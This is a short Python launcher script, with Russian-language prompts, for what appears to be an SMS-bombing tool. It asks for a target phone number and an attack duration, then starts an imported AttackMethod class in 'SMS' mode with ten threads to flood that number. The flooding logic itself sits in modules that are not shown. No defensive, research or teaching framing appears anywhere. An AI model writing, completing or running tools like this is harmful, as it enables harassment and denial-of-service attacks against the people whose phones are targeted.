import os
import sys
import argparse
from colorama import Fore
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    sys.exit(1)

target = str(input(f'{Fore.LIGHTRED_EX}Номер телефона: {Fore.LIGHTYELLOW_EX}'))
time = int(input(f'{Fore.LIGHTRED_EX}Время атаки: {Fore.LIGHTYELLOW_EX}'))

#переменные для класса AttackMethod, бывают проблемы
method = 'SMS'
threads = 10

if __name__ == "__main__":

    if not target or not time:
        print('Какой-то параметр отсутствует :(')
        sys.exit(1)

    
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
